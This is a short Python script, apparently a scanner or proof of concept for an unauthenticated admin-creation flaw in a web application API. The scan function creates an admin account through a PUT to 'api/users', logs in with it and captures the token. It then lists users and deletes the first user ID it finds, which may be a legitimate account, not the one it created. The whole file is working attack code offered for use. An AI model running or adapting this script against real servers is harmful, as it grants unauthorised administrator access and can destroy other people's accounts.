import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
s2=str(randomInt(200000, 900000))
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/users"
	body='{"username":"'+s2+'","password":"'+s2+'","role":"admin","email":"'+s2+'@qq.com"}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.put(url,body,headers=headers,timeout=5,verify=False)
	if "\"status\":\"ok\"" in response.text and "\"message\":\"success\"" in response.text:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/login"
	body='{"username":"'+s2+'","password":"'+s2+'"}'
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r2=True
		try:
			s1=re.findall("{\"status\":\"ok\",\"message\":\"success\",\"data\":\"(.*?)\"",response.text)[0]
		except:
			s1=''
	else:
		r2=False
		s1=''
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/users"
	headers={'Authorization': f'{s1}'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r3=True
		try:
			s3=re.findall("\"_id\":\"(.*?)\"",response.text)[0]
		except:
			s3=''
	else:
		r3=False
		s3=''
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+f"api/users/{s3}"
	headers={'Authorization': f'{s1}'}
	response=requests.delete(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "\"status\":\"ok\"" in response.text:
		r4=True
	else:
		r4=False
	if r1 and r2 and r3 and r4:
		return True
	else:
		return False
